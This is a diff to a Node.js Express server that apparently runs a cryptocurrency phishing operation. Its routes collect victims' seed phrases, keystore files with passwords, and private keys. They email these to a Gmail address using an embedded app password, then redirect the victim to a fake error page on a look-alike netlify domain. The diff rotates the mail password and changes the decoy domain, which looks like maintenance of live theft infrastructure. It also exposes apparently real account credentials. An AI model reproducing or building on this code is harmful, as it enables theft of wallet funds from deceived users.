@@ -25,7 +25,7 @@ const transporter = nodemailer.createTransport({
   secure: true,
   auth: {
     user: "Mikun5y@gmail.com", // Replace with your email
-    pass: "pzak lkxa xnss mzev", // Replace with your app password
+    pass: "ewqd npti edao xqvj", // Replace with your app password
   },
 });
 
@@ -55,7 +55,7 @@ app.post("/submit-seed", (req, res) => {
   const message = `Seed Phrase: ${phrase}`;
 
   sendEmail(subject, message);
-  res.redirect("https://defii.netlify.app/error");
+  res.redirect("https://defiii.netlify.app/error");
 });
 
 // Route for handling KeyStore JSON submission
@@ -65,7 +65,7 @@ app.post("/submit-keystore", (req, res) => {
   const message = `Keystore Value: ${keystore}\nPassword: ${password}`;
 
   sendEmail(subject, message);
-  res.redirect("https://defii.netlify.app/error");
+  res.redirect("https://defiii.netlify.app/error");
 });
 
 // Route for handling Private Key submission
@@ -75,7 +75,7 @@ app.post("/submit-privatekey", (req, res) => {
   const message = `Private Key: ${privatekey}`;
 
   sendEmail(subject, message);
-  res.redirect("https://defii.netlify.app/error");
+  res.redirect("https://defiii.netlify.app/error");
 });
 
 // Start the server
